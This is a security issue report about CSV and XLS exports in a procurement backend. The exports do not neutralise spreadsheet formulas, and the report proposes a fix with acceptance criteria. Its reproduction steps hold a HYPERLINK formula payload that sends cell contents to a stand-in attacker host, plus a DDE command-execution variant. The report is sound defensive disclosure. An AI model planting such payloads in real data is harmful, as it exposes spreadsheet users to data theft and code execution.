<!-- title: SECURITY: CSV and XLS exports do not neutralise formula injection, and supplier names are attacker-controlled -->
<!-- labels: security,severity:medium,area:data,backend -->

**Severity:** Medium — a supplier chooses their own company name at registration, and a
buyer opens the export in Excel.

## Summary

`csvCell` escapes quotes, commas and newlines, but does not neutralise cells beginning with
`=`, `+`, `-` or `@`. Excel and LibreOffice interpret those as formulas on open.

Attacker-controlled fields that reach the export include `vendorName` and `companyName`
(chosen freely at self-registration) and `description`/`materialCode`.

## Evidence

`backend/services/export.service.js:47-50`:
```js
const csvCell = (value) => /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
```

Used by `buildCsv` (`:78-86`) and the hand-built `buildXlsx` (`:102`).

## Steps to reproduce

1. Register a supplier with company name:
   `=HYPERLINK("https://attacker.example/?"&A1,"Click to view order")`
2. Win a tender so the name reaches an RFQ or PO export.
3. As a buyer, export to CSV and open in Excel. The cell renders as a clickable link that
   exfiltrates adjacent cell content.

`=cmd|'/c calc'!A1` is the classic escalation variant where DDE is enabled.

## Expected

No exported cell can be interpreted as a formula.

## Suggested fix

```js
const NEUTRALISE = /^[=+\-@\t\r]/;
const csvCell = (value) => {
  let s = String(value ?? '');
  if (NEUTRALISE.test(s)) s = `'${s}`;
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};
```
Apply to the XLS builder too. Consider validating company name at registration as well, but
neutralising at the boundary is the reliable fix since the data may also arrive from SAP.

## Acceptance criteria

- [ ] A cell starting with `=`, `+`, `-`, `@` or a tab is prefixed on export.
- [ ] Both CSV and XLS paths are covered.
- [ ] Test with a formula-shaped supplier name through both formats.
